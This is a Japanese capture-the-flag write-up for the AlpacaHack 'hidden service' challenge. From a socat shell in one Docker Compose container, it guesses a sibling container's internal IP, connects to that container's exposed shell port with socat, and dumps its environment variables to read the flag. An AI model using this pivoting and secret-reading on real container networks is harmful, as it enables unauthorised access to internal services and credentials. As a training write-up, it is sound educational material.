# hidden service

## / Overview

socatを用いたdocker compose内部通信

## / Writeup

配布されたファイルの`compose.yaml`を見ると，推測不可能なサービス名（ここでは`??`とする）をもつコンテナの環境変数にフラグがセットされています．もう一つ`public`というサービスも起動していて，私たちが`nc 34.170.146.252 22425`することによって接続されるのはこちらです．それぞれのコンテナは独立しているため互いの環境変数を自分のファイルシステムから確認するのは不可能です．実際`public`の環境変数を確認しても`FLAG`はありません．

```sh
$ printenv
HOSTNAME=81e69e0bdd63
SOCAT_PEERADDR=119.228.129.133
HOME=/nonexistent
SOCAT_PEERPORT=62500
SOCAT_SOCKADDR=172.16.41.2
PYTHON_SHA256=d923c51303e38e249136fc1bdf3568d56ecb03214efdef48516176d3d7faaef8
SOCAT_VERSION=1.8.0.3
SOCAT_SOCKPORT=1337
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PYTHON_VERSION=3.14.4
SOCAT_PID=2887
PWD=/
SOCAT_PPID=1
```

つまり今回のチャレンジのゴールは`public`から`??`に接続し，環境変数を盗み出すことです．

これを実現するための第一の壁は，**何を使って**接続するかです．もう一度`compose.yaml`を見ると，それぞれのサービスの`build`に`.`が設定されていますが，これはカレントディレクトリに存在する`Dockerfile`をコンテナ作成時に起動するという意味になります[[1](https://docs.docker.jp/compose/compose-file/build.html#build)]．`Dockerfile`も配布されているため中身を見ると，最後に
```sh
socat -T60 TCP-L:1337,fork,reuseaddr EXEC:sh,stderr,pty,ctty,setsid,echo=0
```
が実行されています．Daily AlpacaHackでよくある設定なので見落としがちですが，socatが外部接続機能を持っていますね．socatの使い方は`socat <入力元> <送信先>`で，入力元から送信された内容が送信先で処理されてその結果が返って来るようになっています[[2](http://x68000.q-e-d.net/~68user/unix/pickup?socat)]．これで第一の壁はクリアです．

第二の壁は，**どうやって**`??`に接続するかです．そもそも`public`から遠隔でコマンド入力がしたいなら，`??`のシェルを触ることができる都合の良いポートが開いていないといけないのですが，そんなポートが実は開いています．その理由が先程も述べた通り，`??`も`public`と同じ`Dockerfile`を読み込んでいるからです．`??`も1337番ポートでシェルを待ち構えています．

つまり，`??`(サービス名)もしくはIPアドレスさえ分かれば

```sh
socat STDIO TCP4:(??かIPアドレス):1337
```
でリモート接続ができそうです．

ここでもう一度，`public`の環境変数を見てみましょう．`SOCAT_SOCKADDR=172.16.41.2`はどうやら`public`がsocatで使っているIPアドレスの様です．じゃあ`??`が使っているアドレスはこれの次の`172.16.41.3`である可能性が高いんじゃないでしょうか？

> [!TIP]
> `/proc/net/arp`のARPテーブル見たら確認できるっぽい

実際に試してみると当たりです．そのまま環境変数まで見てしまいましょう．

```sh
$ socat STDIO TCP4:172.16.41.3:1337
$ printenv
HOSTNAME=e95b6317d2d5
SOCAT_PEERADDR=172.16.41.2
HOME=/nonexistent
SOCAT_PEERPORT=52274
SOCAT_SOCKADDR=172.16.41.3
PYTHON_SHA256=d923c51303e38e249136fc1bdf3568d56ecb03214efdef48516176d3d7faaef8
SOCAT_VERSION=1.8.0.3
SOCAT_SOCKPORT=1337
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PYTHON_VERSION=3.14.4
SOCAT_PID=158
PWD=/
SOCAT_PPID=1
FLAG=Alpaca{...}
```